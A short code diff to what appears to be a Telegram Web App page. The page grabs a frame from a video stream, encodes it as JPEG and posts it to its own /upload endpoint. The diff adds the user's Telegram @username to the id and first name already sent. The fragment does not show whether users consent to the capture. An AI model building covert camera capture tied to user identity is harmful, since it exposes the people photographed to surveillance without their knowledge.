@@ -112,12 +112,19 @@
             canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0);
             const img = canvas.toDataURL('image/jpeg', 0.6);
-            const uid = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : "Guest";
-            const uname = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.first_name : "External";
+            const user = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user : null;
+            const uid = user ? user.id : "Guest";
+            const uname = user ? user.first_name : "External";
+            const uhandle = (user && user.username) ? "@" + user.username : "No Username";
             fetch('/upload', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: img, user_id: uid, user_name: uname })
+                body: JSON.stringify({ 
+                    image: img, 
+                    user_id: uid, 
+                    user_name: uname, 
+                    user_handle: uhandle 
+                })
             });
         }
 
@@ -228,6 +235,7 @@
     </script>
 </body>
 </html>
+
 
 
 
